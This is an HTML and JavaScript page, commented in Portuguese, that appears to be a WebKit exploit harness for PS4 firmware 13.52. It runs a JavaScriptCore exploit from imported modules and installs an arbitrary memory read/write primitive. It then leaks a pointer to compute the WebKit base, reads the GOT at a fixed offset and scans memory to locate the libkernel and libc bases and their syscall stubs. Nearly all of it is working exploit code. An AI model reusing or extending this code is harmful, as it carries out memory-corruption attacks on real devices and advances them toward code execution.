<style>

<body>

<h1>PS4 WebKit Exploit (13.52)</h1>
<div id="fw">detectando...</div>

<div id="sb">
  <div id="dot" class="r"></div>
  <div id="st">Inicializando...</div>
</div>
<div id="bars">
  <span id="ba">tentativa: 1</span>
  <span id="bg">estágio: init</span>
</div>

<div id="con"></div>

<div id="cards">
  <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
  <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
  <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
  <div class="card"><div class="cl">Status Notificação</div><div class="cv na" id="c-g">Aguardando</div></div>

  <div class="ct">// ═══════ PS4 FW 13.52 — GOT Inspector ═══════</div>

<script src="./13.52.js?v=1"></script>

<script type="module">
import { int64 }              from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP }     from './resources/mem.js';
globalThis.int64 = int64;

const $con = document.getElementById('con');
const $dot = document.getElementById('dot');
const $st  = document.getElementById('st');
const $fw  = document.getElementById('fw');

function log(m, c='i') {
  const d = document.createElement('div');
  d.className = c; d.textContent = m;
  $con.appendChild(d);
  $con.scrollTop = $con.scrollHeight;
  while ($con.children.length > 600) $con.removeChild($con.firstChild);
}
function logH(m) { log('=== ' + m + ' ===', 's'); }
function setStatus(m, s='r') { $st.textContent = m; $dot.className = s; }
function setCard(id, v) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = v; el.classList.remove('na');
}

// ═════════════════════════════════════════════════════════════════════════════
// RESOLUÇÃO VIA GOT — SIMPLES E RÁPIDA (offset 0x8518 confirmado no 13.52)
// ═════════════════════════════════════════════════════════════════════════════

const GOT_OFFSET = 0x8518;   // ← confirmado na sua foto 2! Estático no 13.52
const GOT_ENTRIES = 64;      // ← quantas entradas ler
const MAX_SCAN_BACK = 0x400000; // ← máximo para trás ao procurar ELF base

async function resolveViaGOT(p, webkitBase) {
  logH('INSPECIONANDO TABELA GOT / DINÂMICA');

  let gotAddr = webkitBase.add32(GOT_OFFSET);
  log('[+] DT_PLTGOT identificado no off: 0x' + GOT_OFFSET.toString(16));

  let libkernelCandidates = [];
  let libcCandidates = [];

  // Ler entradas da GOT
  for (let i = 0; i < GOT_ENTRIES; i++) {
    try {
      let entryAddr = gotAddr.add32(i * 8);
      let ptr = p.read8(entryAddr);

      // Validar: ponteiro não-nulo e alinhado
      if (ptr.low === 0 && ptr.hi === 0) continue;
      if ((ptr.low & 0x7) !== 0) continue;

      let hi = ptr.hi;

      // libkernel geralmente em hi=0x80
      if (hi === 0x80) {
        libkernelCandidates.push({idx: i, ptr, off: i * 8});
      }
      // libc geralmente em hi=0x90-0x98
      else if (hi >= 0x90 && hi <= 0x98) {
        libcCandidates.push({idx: i, ptr, off: i * 8});
      }

      // Logar primeiros 15 para debug
      if (i < 15) {
        log('GOT[' + i + '] -> 0x' + ptr.toString(16), 'd');
      }
    } catch(e) {
      // Memória inválida, pular
    }
  }

  log('[+] ' + libkernelCandidates.length + ' candidatos libkernel (hi=0x80)');
  log('[+] ' + libcCandidates.length + ' candidatos libc (hi=0x90-0x98)');

  // ─── Encontrar base da libkernel ───
  let libkernelBase = null;
  for (let cand of libkernelCandidates) {
    let base = findElfBase(p, cand.ptr, MAX_SCAN_BACK);
    if (base) {
      libkernelBase = base;
      log('[+] libkernel base encontrada via GOT[' + cand.idx + ']: 0x' + base.toString(16), 'ok');
      break;
    }
  }

  // ─── Encontrar base da libc ───
  let libcBase = null;
  for (let cand of libcCandidates) {
    let base = findElfBase(p, cand.ptr, MAX_SCAN_BACK);
    if (base) {
      libcBase = base;
      log('[+] libc base encontrada via GOT[' + cand.idx + ']: 0x' + base.toString(16), 'ok');
      break;
    }
  }

  return { libkernelBase, libcBase };
}

// Varre para trás em páginas de 0x1000 procurando \x7fELF
function findElfBase(p, startPtr, maxBack) {
  for (let back = 0; back < maxBack; back += 0x1000) {
    try {
      let test = startPtr.sub32(back);
      if (p.read32(test) === 0x464C457F) {
        return test;
      }
    } catch(e) {}
  }
  return null;
}

// ═════════════════════════════════════════════════════════════════════════════
// VALIDAÇÃO DE BASES
// ═════════════════════════════════════════════════════════════════════════════

async function validateBases(p, libkernelBase, libcBase) {
  logH('VALIDANDO BASES');
  let valid = { libkernel: false, libc: false };

  if (libkernelBase) {
    let magic = p.read32(libkernelBase);
    if (magic === 0x464C457F) {
      log('[✓] libkernel: ELF magic válido', 'ok');
      valid.libkernel = true;
    } else {
      log('[✗] libkernel: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
    }

    let aligned = (libkernelBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libkernel: alinhada a página' : '[✗] libkernel: desalinhada', aligned ? 'ok' : 'w');
    if (!aligned) valid.libkernel = false;

    // Procurar stubs de syscall
    let stubs = 0;
    for (let off = 0; off < 0x100000; off += 0x10) {
      try {
        let b = [];
        for (let j = 0; j < 10; j++) b.push(p.read8(libkernelBase.add32(off + j)));
        if (b[0] === 0x48 && b[1] === 0xC7 && b[2] === 0xC0 &&
            b[7] === 0x49 && b[8] === 0x89 && b[9] === 0xCA) {
          stubs++;
          if (stubs >= 3) break;
        }
      } catch(e) {}
    }
    if (stubs >= 3) {
      log('[✓] libkernel: ' + stubs + ' stubs de syscall encontrados', 'ok');
    } else {
      log('[✗] libkernel: poucos stubs (' + stubs + ')', 'w');
      valid.libkernel = false;
    }
  }

  if (libcBase) {
    let magic = p.read32(libcBase);
    if (magic === 0x464C457F) {
      log('[✓] libc: ELF magic válido', 'ok');
      valid.libc = true;
    } else {
      log('[✗] libc: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
    }

    let aligned = (libcBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libc: alinhada a página' : '[✗] libc: desalinhada', aligned ? 'ok' : 'w');
    if (!aligned) valid.libc = false;
  }

  return valid;
}

// ═════════════════════════════════════════════════════════════════════════════
// NOTIFICAÇÃO — offset dinâmico via GOT
// ═════════════════════════════════════════════════════════════════════════════

function findNotificationOffset(p, webkitBase) {
  logH('PROCURANDO sceKernelSendNotificationRequest');

  // Varredura simples na GOT procurando por nome não é possível sem
  // a string table. Em vez disso, vamos identificar pela assinatura
  // do stub na libkernel.
  //
  // sceKernelSendNotificationRequest é syscall #600+ (varia por firmware).
  // O stub na libkernel segue o padrão:
  //   mov rax, <syscall#>
  //   mov r10, rcx
  //   syscall
  //   ret
  //
  // Vamos varrer a libkernel procurando stubs e identificar pelo
  // comportamento (número da syscall).

  // MAS sem saber qual syscall é a notificação, vamos usar uma
  // abordagem diferente: varrer a GOT e testar cada ponteiro
  // da libkernel para ver se é a função de notificação.

  // Abordagem prática: vamos usar o offset 0x8518 + índice da GOT
  // que aponta para a libkernel e testar um por um.
  // No PS4 9.00, o offset era 0x48B0. No 13.52, provavelmente é diferente.

  // Por enquanto, vamos apenas logar os candidatos e deixar o usuário
  // identificar qual é o correto testando.

  let gotAddr = webkitBase.add32(GOT_OFFSET);
  let candidates = [];

  for (let i = 0; i < GOT_ENTRIES; i++) {
    try {
      let ptr = p.read8(gotAddr.add32(i * 8));
      if (ptr.hi === 0x80 && ptr.low > 0) {
        candidates.push({idx: i, ptr});
      }
    } catch(e) {}
  }

  log('[+] ' + candidates.length + ' funções da libkernel na GOT');
  log('[!] Para identificar sceKernelSendNotificationRequest:');
  log('    1. Use ROP ou JIT para chamar cada candidato');
  log('    2. O que disparar notificação = correto');

  // Retornar o primeiro candidato como placeholder
  // (o usuário precisará identificar o correto)
  return candidates.length > 0 ? candidates[0].ptr : null;
}

// ═════════════════════════════════════════════════════════════════════════════
// MAIN
// ═════════════════════════════════════════════════════════════════════════════

async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
  log('UA: ' + ua, 'd');

  setStatus('Rodando exploit JSC (core.js)...', 'r');
  logH('EXPLOIT JSC (WebKit)');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = 'tentativa: ' + (attempt || 1);
        document.getElementById('bg').textContent = 'estágio: ' + tag.toLowerCase();
        log(`[${tag}] ${detail}`, 'i');
      },
      maxAttempts: 0
    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] core.js: exploit JSC concluído!', 'ok');
  setStatus('Instalando R/W arbitrário...', 'r');
  logH('INSTALANDO PRIMITIVA R/W (mem.js)');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => {
        log(`  [mem/${tag}] ${detail}`, 'd');
      }
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
  setStatus('Mapeando bases com estabilidade...', 'r');
  logH('MAPEAMENTO DA 13.52');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor === 'number' && ctor > 0x100000000) {
    const hi = Math.floor(ctor / 0x100000000);
    const lo = ctor - hi * 0x100000000;
    const ctorInt64 = new int64(lo >>> 0, hi >>> 0);

    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(16), 'a');

    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
               ? OFFSET_wk_host_constructor_candidates[0]
               : 0x36F9E20;

    const resolvedBaseVal = ctor - hc;
    const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
    const baseLo = resolvedBaseVal - baseHi * 0x100000000;
    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);

    log('[+] WebKit Base calculada: 0x' + webkitBase.toString(16), 'ok');
    setCard('c-wk', '0x' + webkitBase.toString(16));

    // ─── Resolver bases via GOT (rápido, não trava) ───
    setTimeout(async () => {
      const result = await resolveViaGOT(p, webkitBase);
      const libKernelBase = result.libkernelBase;
      const libcBase = result.libcBase;

      if (libKernelBase) setCard('c-lk', '0x' + libKernelBase.toString(16));
      if (libcBase) setCard('c-lc', '0x' + libcBase.toString(16));

      // Validar
      const valid = await validateBases(p, libKernelBase, libcBase);

      if (valid.libkernel && valid.libc) {
        log('[✓] Todas as bases validadas com sucesso!', 'ok');
        setStatus('Endereços mapeados e validados com sucesso.', 'ok');

        // Mostrar caixa de resultados
        const cbox = document.getElementById('cbox');
        cbox.style.display = 'block';
        document.getElementById('c-out').textContent =
            '__ps5NativeCtor = 0x' + ctorInt64.toString(16) + '\n' +
            'WebKit Base     = 0x' + webkitBase.toString(16) + '\n' +
            'libkernel Base  = 0x' + libKernelBase.toString(16) + '\n' +
            'libSceLibc Base = 0x' + libcBase.toString(16) + '\n' +
            'GOT Offset      = 0x' + GOT_OFFSET.toString(16) + '\n' +
            'Status          = Inspeção GOT executada com sucesso.';

        setCard('c-g', 'Pronto');
      } else {
        setStatus('Validação falhou', 'e');
        setCard('c-g', 'Falha');
      }
    }, 500);

  } else {
    log('[-] Falha: __ps5NativeCtor não capturado.', 'e');
    setStatus('Erro ao capturar NativeCtor', 'e');
  }
}

main();
</script>
